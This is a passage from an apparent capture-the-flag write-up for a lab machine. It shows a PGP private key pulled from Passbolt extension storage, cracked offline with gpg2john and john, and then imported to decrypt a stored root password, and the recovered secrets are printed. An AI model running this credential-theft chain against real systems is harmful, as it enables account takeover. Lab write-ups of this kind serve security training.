49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS\\r\\nUCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU\\r\\nNsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf\\r\\nQmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm\\r\\noRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg\\r\\n6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/\\r\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----\\r\\n\",\"keyId\":\"dc3b4abd\",\"userIds\":[{\"name\":\"Eddie Johnson\",\"email\":\"eddie@bolt.htb\"}],\"fingerprint\":\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\",\"created\":\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":2048,\"private\":true,\"user_id\":\"MY_KEY_ID\"}}",
    "passbolt-public-gpgkeys": "{\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\":{\"key\":\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\n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\\r\\n=FBUR\\r\\n-----END PGP PUBLIC KEY BLOCK-----\\r\\n\",\"keyId\":\"56a16c84\",\"userIds\":[{\"name\":\"Passbolt Server Key\",\"email\":\"admin@bolt.htb\"}],\"fingerprint\":\"59860a269e803fa094416753ab8e2efb56a16c84\",\"created\":\"Wed Feb 24 2021 12:15:49 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":3072,\"private\":false,\"user_id\":\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\"},\"4e184ee6-e436-47fb-91c9-dccb57f250bc\":{\"key\":\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\r\\nAAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC\\r\\nYDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE\\r\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ\\r\\nHmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8\\r\\nwBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD\\r\\nCm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM\\r\\nWZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6\\r\\nOUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4\\r\\nU8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox\\r\\noBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc\\r\\noOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt\\r\\nvK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1\\r\\nlXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC\\r\\nUmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c\\r\\ntEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE\\r\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z\\r\\n5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8\\r\\nIOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc\\r\\nPyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC\\r\\n/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg\\r\\npmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1\\r\\ntD0sGGFpQMsI+Q==\\r\\n=+pbw\\r\\n-----END PGP PUBLIC KEY BLOCK-----\\r\\n\",\"keyId\":\"dc3b4abd\",\"userIds\":[{\"name\":\"Eddie Johnson\",\"email\":\"eddie@bolt.htb\"}],\"fingerprint\":\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\",\"created\":\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":2048,\"private\":false,\"user_id\":\"4e184ee6-e436-47fb-91c9-dccb57f250bc\"}}"
}
```

Extract the private key.

```bash
$ echo '-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\n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\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----' | sed 's/\\r\\n/\n/g' | tee eddie.key
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

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
PSwYYWlAywj5
=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
```

Brute force the passphrase to the private key: `merrychristmas`.

```bash
$ gpg2john eddie.key | tee eddie.john

File eddie.key
Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson <eddie@bolt.htb>::eddie.key

$ john eddie.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
merrychristmas   (Eddie Johnson)
1g 0:00:03:28 DONE (2022-02-21 22:58) 0.004797g/s 205.5p/s 205.5c/s 205.5C/s mhines..megan5
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Import `eddie`'s private key, entering the passphrase `merrchristmas` when prompted.  Use the private key to decrypt the message, entering the passphrase when prompted. `root`'s password is  `Z(2rmxsNW(Z?3=p/9s`.

```bash
$ gpg --import eddie.key
gpg: key 1C2741A3DC3B4ABD: "Eddie Johnson <eddie@bolt.htb>" not changed
gpg: key 1C2741A3DC3B4ABD: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

$ cat eddie.password | gpg -d
gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
